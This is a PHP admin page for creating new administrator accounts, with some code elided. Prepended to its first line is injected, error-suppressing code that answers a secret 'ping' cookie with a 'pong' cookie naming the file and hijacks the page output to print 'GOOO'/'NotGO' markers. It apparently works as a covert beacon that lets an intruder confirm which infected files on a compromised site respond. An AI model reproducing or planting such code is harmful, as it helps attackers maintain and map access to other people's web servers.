<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/new_admin.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/new_admin.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/new_admin.php<-";}return "NotGO->./cynergi/admin/new_admin.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
...
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
  $insertSQL = sprintf("INSERT INTO tbl_admins (username, `names`, password) VALUES (%s, %s, %s)",
  ...
  <tr>
    <td align="center" valign="top"><p>&nbsp;</p>
      <table width="400" border="0">
        <tr>
          <td align="center" class="titulo">Create a new Administrator</td>
        </tr>
      </table>
      <br />
